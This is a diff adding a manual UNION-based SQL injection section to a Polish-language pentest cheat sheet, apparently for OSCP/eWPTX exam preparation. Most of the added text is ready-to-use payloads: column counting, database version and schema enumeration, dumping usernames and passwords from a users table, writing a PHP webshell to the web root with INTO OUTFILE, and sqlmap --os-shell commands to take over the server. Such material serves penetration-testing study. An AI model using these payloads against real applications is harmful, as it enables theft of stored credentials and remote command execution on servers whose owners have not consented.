@@ -13,7 +13,94 @@ Ataki typu Injection polegają na wstrzyknięciu złośliwego kodu do aplikacji 
 ## 🛠️ SQL Injection
 SQL Injection (SQLi) polega na manipulacji zapytaniami SQL w celu uzyskania nieautoryzowanego dostępu do bazy danych.
 
-### **1️⃣ Wykorzystanie sqlmap**
+---
+
+## 🔬 Ręczny SQL Injection (UNION-based)
+
+Automatyczne narzędzia jak sqlmap bywają zablokowane przez WAF lub zbyt hałaśliwe. Ręczne techniki są niezbędne na egzaminach OSCP/eWPTX i pozwalają w pełni zrozumieć podatność.
+
+### **1️⃣ Ustalenie liczby kolumn**
+Zwiększaj liczbę kolumn w `ORDER BY` aż do błędu — poprzednia liczba to liczba kolumn:
+
+```sql
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --   ← błąd → 2 kolumny
+```
+
+Alternatywnie przez `UNION NULL`:
+```sql
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+```
+
+### **2️⃣ Identyfikacja widocznych kolumn i wersji bazy**
+Gdy znasz liczbę kolumn, sprawdź które są renderowane w odpowiedzi:
+
+```sql
+' UNION SELECT 1,2 --
+' UNION SELECT 'a',NULL --
+' UNION SELECT NULL,'a' --
+```
+
+Wydobądź wersję i użytkownika bazy:
+```sql
+' UNION SELECT VERSION(),user() --
+' UNION SELECT @@version,@@datadir --
+```
+
+### **3️⃣ Enumeracja baz, tabel i kolumn przez information_schema**
+
+Dostępne bazy danych:
+```sql
+' UNION SELECT schema_name,NULL FROM information_schema.SCHEMATA --
+```
+
+Tabele w wybranej bazie:
+```sql
+' UNION SELECT table_name,NULL FROM information_schema.TABLES WHERE table_schema='mydb' --
+```
+
+Kolumny w tabeli `users`:
+```sql
+' UNION SELECT column_name,NULL FROM information_schema.COLUMNS WHERE table_name='users' --
+```
+
+Dump danych:
+```sql
+' UNION SELECT username,password FROM users --
+```
+
+### **4️⃣ Zapis webshella przez INTO OUTFILE**
+Jeśli baza działa na tym samym serwerze co web root i użytkownik MySQL ma uprawnienia `FILE`:
+
+```sql
+' UNION SELECT "<?php echo shell_exec($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php' --
+```
+
+Weryfikacja dostępu:
+```bash
+curl "http://example.com/shell.php?cmd=id"
+```
+
+> **Wymaga:** `FILE` privilege w MySQL, katalog web root zapisywalny dla procesu MySQL, brak `secure_file_priv`.
+
+### **5️⃣ sqlmap –os-shell**
+Gdy ręczny test potwierdził podatność i uprawnienia FILE, sqlmap może przejąć shell:
+
+```bash
+sqlmap -u "http://example.com/index.php?id=1" --os-shell
+```
+
+sqlmap automatycznie wgra webshell i uruchomi interaktywną konsolę. Opcja `--web-root` wskazuje ścieżkę jeśli autodetekcja zawodzi:
+```bash
+sqlmap -u "http://example.com/index.php?id=1" --os-shell --web-root="/var/www/html"
+```
+
+---
+
+### **6️⃣ Wykorzystanie sqlmap**
 `sqlmap` to narzędzie automatyzujące wykrywanie i eksploatację SQL Injection.
 
 #### **Podstawowe skanowanie**
